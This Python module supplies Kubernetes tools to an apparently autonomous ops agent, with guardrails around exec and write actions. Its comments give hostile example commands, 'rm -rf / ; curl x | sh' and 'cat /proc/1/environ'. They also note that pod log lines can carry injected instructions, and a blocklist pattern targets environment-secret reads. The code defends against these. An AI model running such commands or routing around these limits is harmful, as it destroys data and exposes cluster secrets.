"""Kubernetes API tools for the agent."""

from __future__ import annotations

import json
import logging
from datetime import UTC, datetime
from typing import TYPE_CHECKING, Any

from kubernetes import client, config
from kubernetes import stream as _k8s_stream_mod
from kubernetes.client.rest import ApiException

from home_ops_agent import audit
from home_ops_agent.agent import untrusted
from home_ops_agent.agent.core import ToolDefinition

if TYPE_CHECKING:
    from home_ops_agent.agent.skills import SkillDefinition

logger = logging.getLogger(__name__)

# Taken as an attribute of the package, not as `from kubernetes.stream import
# stream`. This file is itself named kubernetes.py, so the dotted form makes the
# import machinery resolve `kubernetes` to this module and fail with
# "'kubernetes' is not a package" -- while the plain `from kubernetes import
# client` above works, because that is satisfied from sys.modules. Binding the
# callable here also gives tests one place to patch.
k8s_stream = _k8s_stream_mod.stream

# Initialize Kubernetes client (in-cluster or from kubeconfig)
try:
    config.load_incluster_config()
except config.ConfigException:
    config.load_kube_config()

core_v1 = client.CoreV1Api()
apps_v1 = client.AppsV1Api()
custom_api = client.CustomObjectsApi()


def _serialize(obj: Any) -> Any:
    """Serialize Kubernetes API objects to JSON-safe dicts."""
    if isinstance(obj, datetime):
        return obj.isoformat()
    if hasattr(obj, "to_dict"):
        return obj.to_dict()
    return str(obj)


async def get_pods(params: dict) -> str:
    """List pods in a namespace."""
    namespace = params.get("namespace", "default")
    label_selector = params.get("label_selector", "")

    try:
        pods = core_v1.list_namespaced_pod(
            namespace=namespace,
            label_selector=label_selector,
        )
        result = []
        for pod in pods.items:
            container_statuses = []
            for cs in pod.status.container_statuses or []:
                container_statuses.append(
                    {
                        "name": cs.name,
                        "ready": cs.ready,
                        "restart_count": cs.restart_count,
                        "state": str(cs.state),
                    }
                )
            result.append(
                {
                    "name": pod.metadata.name,
                    "namespace": pod.metadata.namespace,
                    "phase": pod.status.phase,
                    "node": pod.spec.node_name,
                    "containers": container_statuses,
                    "created": pod.metadata.creation_timestamp,
                }
            )
        return json.dumps(result, default=_serialize)
    except ApiException as e:
        return json.dumps({"error": f"Failed to list pods: {e.reason}"})


async def get_pod_logs(params: dict) -> str:
    """Get logs from a pod."""
    namespace = params["namespace"]
    pod_name = params["pod_name"]
    container = params.get("container")
    tail_lines = params.get("tail_lines", 100)

    try:
        logs = core_v1.read_namespaced_pod_log(
            name=pod_name,
            namespace=namespace,
            container=container,
            tail_lines=tail_lines,
        )
        # Application logs carry whatever a service was handed: a User-Agent, a
        # filename, a search query. Alert triage reads these on every alert, so
        # a log line is the cheapest way into a model that holds write tools.
        return untrusted.wrap(f"pod logs {namespace}/{pod_name}", logs or "(no logs)")
    except ApiException as e:
        return json.dumps({"error": f"Failed to get logs: {e.reason}"})


async def get_events(params: dict) -> str:
    """Get events for a namespace or specific resource."""
    namespace = params.get("namespace", "default")
    resource_name = params.get("resource_name")

    try:
        if resource_name:
            field_selector = f"involvedObject.name={resource_name}"
        else:
            field_selector = ""

        events = core_v1.list_namespaced_event(
            namespace=namespace,
            field_selector=field_selector,
        )
        result = []
        sorted_events = sorted(
            events.items,
            key=lambda e: e.last_timestamp or e.metadata.creation_timestamp or datetime.min,
            reverse=True,
        )[:20]
        for event in sorted_events:
            result.append(
                {
                    "type": event.type,
                    "reason": event.reason,
                    "message": event.message,
                    "object": f"{event.involved_object.kind}/{event.involved_object.name}",
                    "count": event.count,
                    "last_seen": event.last_timestamp,
                }
            )
        return json.dumps(result, default=_serialize)
    except ApiException as e:
        return json.dumps({"error": f"Failed to get events: {e.reason}"})


async def describe_resource(params: dict) -> str:
    """Get details of any Kubernetes resource."""
    kind = params["kind"].lower()
    name = params["name"]
    namespace = params.get("namespace", "default")

    try:
        if kind == "pod":
            obj = core_v1.read_namespaced_pod(name, namespace)
        elif kind == "service":
            obj = core_v1.read_namespaced_service(name, namespace)
        elif kind == "deployment":
            obj = apps_v1.read_namespaced_deployment(name, namespace)
        elif kind == "statefulset":
            obj = apps_v1.read_namespaced_stateful_set(name, namespace)
        elif kind == "daemonset":
            obj = apps_v1.read_namespaced_daemon_set(name, namespace)
        elif kind == "node":
            obj = core_v1.read_node(name)
        elif kind == "configmap":
            obj = core_v1.read_namespaced_config_map(name, namespace)
        elif kind == "pvc":
            obj = core_v1.read_namespaced_persistent_volume_claim(name, namespace)
        else:
            return json.dumps({"error": f"Unsupported kind: {kind}"})

        return json.dumps(_serialize(obj), default=_serialize)
    except ApiException as e:
        return json.dumps({"error": f"Failed to describe {kind}/{name}: {e.reason}"})


async def get_nodes(params: dict) -> str:
    """Get node status and resource usage."""
    try:
        nodes = core_v1.list_node()
        result = []
        for node in nodes.items:
            conditions = {c.type: c.status for c in node.status.conditions or []}
            result.append(
                {
                    "name": node.metadata.name,
                    "conditions": conditions,
                    "capacity": {
                        "cpu": node.status.capacity.get("cpu"),
                        "memory": node.status.capacity.get("memory"),
                        "pods": node.status.capacity.get("pods"),
                    },
                    "allocatable": {
                        "cpu": node.status.allocatable.get("cpu"),
                        "memory": node.status.allocatable.get("memory"),
                        "pods": node.status.allocatable.get("pods"),
                    },
                }
            )
        return json.dumps(result, default=_serialize)
    except ApiException as e:
        return json.dumps({"error": f"Failed to list nodes: {e.reason}"})


# Namespaces where the agent must NOT take destructive actions
PROTECTED_NAMESPACES = {"kube-system", "flux-system", "cert-manager"}


# --- exec guardrails --------------------------------------------------------
#
# Exec is arbitrary code execution inside somebody else's container, run by an
# agent that acts unattended. The limits below are enforced here rather than
# described in the tool's prompt, because a prompt is advice and this needs to
# be a wall.
#
# Two properties do the work:
#
# 1. There is no shell. argv goes to the Kubernetes exec API as a list, so
#    pipes, redirection, chaining, globbing and command substitution cannot be
#    expressed at all. `ps -eo pid,stat` is sayable; `rm -rf / ; curl x | sh`
#    is not, because there is nothing to interpret the `;`.
# 2. argv[0] must be one of these. Everything here reads and reports; nothing
#    writes, deletes, signals, or fetches from the network. Shells and
#    interpreters are absent deliberately -- allowing `sh` would hand back
#    everything property 1 removes.
EXEC_ALLOWED_BINARIES = frozenset(
    {
        "ps",
        "pgrep",
        "top",
        "uptime",
        "free",
        "vmstat",
        "nproc",
        "df",
        "du",
        "ls",
        "stat",
        "readlink",
        "find",
        "cat",
        "head",
        "tail",
        "wc",
        "grep",
        "md5sum",
        "sha256sum",
        "ss",
        "netstat",
        "ip",
        "hostname",
        "id",
        "uname",
        "date",
    }
)

# Reading a process's environment would turn a diagnostic tool into a secret
# reader: /proc/<pid>/environ holds every value injected by envFrom, and this
# agent has no Secret-reading tool precisely so that it cannot do that. The
# output would also land in the transcript and the audit log. `cat` is allowed
# and useful; `cat /proc/1/environ` is not.
EXEC_FORBIDDEN_ARG_SUBSTRINGS = ("environ",)

EXEC_TIMEOUT_SECONDS = 20
EXEC_MAX_OUTPUT_CHARS = 8000


def _check_exec_command(command: list[str]) -> str | None:
    """Return an error payload if this argv is not allowed, else None."""
    if not isinstance(command, list) or not command:
        return json.dumps(
            {"error": "command must be a non-empty list of arguments, e.g. ['ps', '-ef']"}
        )
    if not all(isinstance(a, str) for a in command):
        return json.dumps({"error": "every element of command must be a string"})

    # basename, so /bin/ps and ps are judged the same
    binary = command[0].rsplit("/", 1)[-1]
    if binary not in EXEC_ALLOWED_BINARIES:
        return json.dumps(
            {
                "error": (
                    f"BLOCKED: '{binary}' is not an allowed exec binary. This tool runs "
                    "read-only diagnostics with no shell, so pipes and chaining are not "
                    "available either. Allowed: " + ", ".join(sorted(EXEC_ALLOWED_BINARIES))
                )
            }
        )

    for arg in command:
        lowered = arg.lower()
        for bad in EXEC_FORBIDDEN_ARG_SUBSTRINGS:
            if bad in lowered:
                return json.dumps(
                    {
                        "error": (
                            f"BLOCKED: argument {arg!r} contains {bad!r}. Reading a "
                            "process environment would expose injected secrets, which "
                            "this agent deliberately cannot do."
                        )
                    }
                )
    return None


# Deliberately not @audit.records: the write audit is a list of changes the
# agent made, and these commands change nothing. test_every_write_tool_records_
# itself enforces both halves of that, and it caught this when the decorator
# was here -- a `ps` listing in the audit would bury the writes it exists to
# surface.
async def exec_in_pod(params: dict) -> str:
    """Run one read-only diagnostic command inside a running container.

    Exists because pod status cannot answer questions about what is happening
    *inside* a container. Asked to look for zombie processes in ai-harness, the
    agent could report only "Running and Ready, zero restarts" -- true, and no
    evidence either way, since a zombie shows up in none of it.
    """
    name = params["name"]
    namespace = params["namespace"]
    container = params.get("container")
    command = params.get("command")

    if error := _check_exec_command(command):
        return error

    try:
        output = k8s_stream(
            core_v1.connect_get_namespaced_pod_exec,
            name,
            namespace,
            container=container,
            command=command,
            stderr=True,
            stdin=False,
            stdout=True,
            tty=False,
            _preload_content=True,
            _request_timeout=EXEC_TIMEOUT_SECONDS,
        )
    except ApiException as e:
        return json.dumps({"error": f"exec failed: {e.reason}"})
    except Exception as e:  # noqa: BLE001 -- websocket/timeout failures are not ApiException
        return json.dumps({"error": f"exec failed: {e}"})

    output = output or "(no output)"
    truncated = len(output) > EXEC_MAX_OUTPUT_CHARS
    if truncated:
        # Say so. A silently cut listing reads as a complete one, and "no
        # zombies after this point" would then be a conclusion drawn from
        # output that was never seen.
        output = output[:EXEC_MAX_OUTPUT_CHARS] + "\n...(truncated)"

    label = f"exec {namespace}/{name}" + (f" [{container}]" if container else "")
    return untrusted.wrap(label, output)


@audit.records("k8s_restart_workload")
async def restart_deployment(params: dict) -> str:
    """Trigger a rollout restart by patching the deployment annotation."""
    name = params["name"]
    namespace = params["namespace"]
    kind = params.get("kind", "deployment").lower()

    if namespace in PROTECTED_NAMESPACES:
        return json.dumps(
            {"error": f"BLOCKED: Cannot restart workloads in protected namespace '{namespace}'"}
        )

    patch = {
        "spec": {
            "template": {
                "metadata": {
                    "annotations": {"home-ops-agent/restartedAt": datetime.now(UTC).isoformat()}
                }
            }
        }
    }

    try:
        if kind == "deployment":
            apps_v1.patch_namespaced_deployment(name, namespace, patch)
        elif kind == "statefulset":
            apps_v1.patch_namespaced_stateful_set(name, namespace, patch)
        else:
            return json.dumps({"error": f"Cannot restart kind: {kind}"})

        return json.dumps({"status": "ok", "message": f"Restarted {kind}/{name} in {namespace}"})
    except ApiException as e:
        return json.dumps({"error": f"Failed to restart: {e.reason}"})


@audit.records("k8s_delete_pod")
async def delete_pod(params: dict) -> str:
    """Delete a pod to force recreation."""
    name = params["name"]
    namespace = params["namespace"]

    if namespace in PROTECTED_NAMESPACES:
        return json.dumps(
            {"error": f"BLOCKED: Cannot delete pods in protected namespace '{namespace}'"}
        )

    try:
        core_v1.delete_namespaced_pod(name, namespace)
        return json.dumps({"status": "ok", "message": f"Deleted pod {name} in {namespace}"})
    except ApiException as e:
        return json.dumps({"error": f"Failed to delete pod: {e.reason}"})


def _get_tools(config: dict) -> list[ToolDefinition]:
    """Return all Kubernetes tool definitions."""
    return get_kubernetes_tools()


def get_kubernetes_tools() -> list[ToolDefinition]:
    """Return all Kubernetes tool definitions."""
    return [
        ToolDefinition(
            name="k8s_get_pods",
            description=(
                "List pods in a Kubernetes namespace with their status,"
                " restarts, and node placement."
            ),
            input_schema={
                "type": "object",
                "properties": {
                    "namespace": {
                        "type": "string",
                        "description": "Kubernetes namespace (default: 'default')",
                    },
                    "label_selector": {
                        "type": "string",
                        "description": "Label selector (e.g., 'app=nginx')",
                    },
                },
            },
            handler=get_pods,
        ),
        ToolDefinition(
            name="k8s_get_pod_logs",
            description=(
                "Get recent logs from a specific pod. Useful for diagnosing crashes or errors."
            ),
            input_schema={
                "type": "object",
                "properties": {
                    "namespace": {"type": "string", "description": "Kubernetes namespace"},
                    "pod_name": {"type": "string", "description": "Pod name"},
                    "container": {
                        "type": "string",
                        "description": "Container name (optional, for multi-container pods)",
                    },
                    "tail_lines": {
                        "type": "integer",
                        "description": "Number of log lines to return (default: 100)",
                    },
                },
                "required": ["namespace", "pod_name"],
            },
            handler=get_pod_logs,
        ),
        ToolDefinition(
            name="k8s_get_events",
            description=(
                "Get Kubernetes events for a namespace or specific resource."
                " Shows warnings, errors, and scheduling info."
            ),
            input_schema={
                "type": "object",
                "properties": {
                    "namespace": {"type": "string", "description": "Kubernetes namespace"},
                    "resource_name": {
                        "type": "string",
                        "description": "Filter events for a specific resource name",
                    },
                },
            },
            handler=get_events,
        ),
        ToolDefinition(
            name="k8s_describe_resource",
            description=(
                "Get full details of a Kubernetes resource"
                " (pod, deployment, statefulset, service, node, configmap, pvc)."
            ),
            input_schema={
                "type": "object",
                "properties": {
                    "kind": {
                        "type": "string",
                        "description": (
                            "Resource kind: pod, deployment, statefulset,"
                            " daemonset, service, node, configmap, pvc"
                        ),
                    },
                    "name": {"type": "string", "description": "Resource name"},
                    "namespace": {
                        "type": "string",
                        "description": "Kubernetes namespace (not needed for nodes)",
                    },
                },
                "required": ["kind", "name"],
            },
            handler=describe_resource,
        ),
        ToolDefinition(
            name="k8s_get_nodes",
            description=(
                "Get node status, conditions, and resource"
                " capacity/allocatable for all cluster nodes."
            ),
            input_schema={"type": "object", "properties": {}},
            handler=get_nodes,
        ),
        ToolDefinition(
            name="k8s_restart_workload",
            description=(
                "Trigger a rollout restart on a deployment or statefulset"
                " by patching its annotation. The pods will be recreated."
            ),
            input_schema={
                "type": "object",
                "properties": {
                    "name": {"type": "string", "description": "Workload name"},
                    "namespace": {"type": "string", "description": "Kubernetes namespace"},
                    "kind": {
                        "type": "string",
                        "description": (
                            "Workload kind: deployment or statefulset (default: deployment)"
                        ),
                    },
                },
                "required": ["name", "namespace"],
            },
            handler=restart_deployment,
        ),
        ToolDefinition(
            name="k8s_delete_pod",
            description=(
                "Delete a specific pod to force its recreation by the controller."
                " Use for stuck pods."
            ),
            input_schema={
                "type": "object",
                "properties": {
                    "name": {"type": "string", "description": "Pod name"},
                    "namespace": {"type": "string", "description": "Kubernetes namespace"},
                },
                "required": ["name", "namespace"],
            },
            handler=delete_pod,
        ),
        ToolDefinition(
            name="k8s_exec",
            description=(
                "Run ONE read-only diagnostic command inside a running container and "
                "return its output. Use this when a question is about what is happening "
                "inside a container rather than about the pod around it -- process "
                "tables, open sockets, disk usage, a file's contents. Pod phase, Ready "
                "and restart count cannot answer those, and reporting them instead is "
                "not an answer.\n\n"
                "There is no shell: pass argv as a list, like ['ps', '-eo', "
                "'pid,ppid,stat,comm']. Pipes, redirection, &&, ; and $() do not work "
                "because nothing interprets them -- filter the output yourself after "
                "reading it. Only read-only binaries are permitted and the call is "
                "rejected if you reach for another."
            ),
            input_schema={
                "type": "object",
                "properties": {
                    "name": {"type": "string", "description": "Pod name"},
                    "namespace": {"type": "string", "description": "Kubernetes namespace"},
                    "container": {
                        "type": "string",
                        "description": (
                            "Container name. Required when the pod has more than one; "
                            "omitting it then fails rather than guessing."
                        ),
                    },
                    "command": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": (
                            "argv as a list, NOT a shell string. "
                            "['ps', '-eo', 'pid,ppid,stat,comm'] is correct; "
                            "['sh', '-c', 'ps | grep Z'] is rejected."
                        ),
                    },
                },
                "required": ["name", "namespace", "command"],
            },
            handler=exec_in_pod,
        ),
    ]


def _make_skill() -> SkillDefinition:
    from home_ops_agent.agent.skills import SkillDefinition

    return SkillDefinition(
        id="kubernetes",
        name="Kubernetes",
        description=(
            "Core Kubernetes API tools: list pods, read logs, describe resources,"
            " get events, restart workloads, and delete pods."
        ),
        builtin=True,
        get_tools=_get_tools,
    )


SKILL: SkillDefinition = _make_skill()
